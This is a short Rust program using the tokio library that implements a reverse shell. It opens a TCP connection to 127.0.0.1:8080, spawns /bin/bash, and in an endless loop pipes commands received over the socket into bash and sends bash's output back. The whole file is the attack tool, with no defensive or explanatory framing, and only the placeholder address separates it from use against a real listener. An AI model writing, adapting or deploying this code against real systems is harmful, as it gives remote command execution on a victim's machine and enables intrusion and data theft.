use tokio::net::TcpStream;
use tokio::io::{self,AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;

#[tokio::main]
async fn main() {
    let mut buff = [0;1024];
    let mut temp =[0;1024];
    let mut stream = TcpStream::connect("127.0.0.1:8080").await.unwrap();

    let mut child = Command::new("/bin/bash").stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().expect("Failed to spawn child process");
    let mut stdout = child.stdout.take().unwrap();
    let mut stdin = child.stdin.take().unwrap();
    loop{
    let n = stream.read(&mut buff).await;

    stdin.write(&buff[..n.unwrap()]).await.unwrap();
    
    let data = stdout.read(&mut temp).await;
    stream.write(&temp[..data.unwrap()]).await.unwrap();
    }
}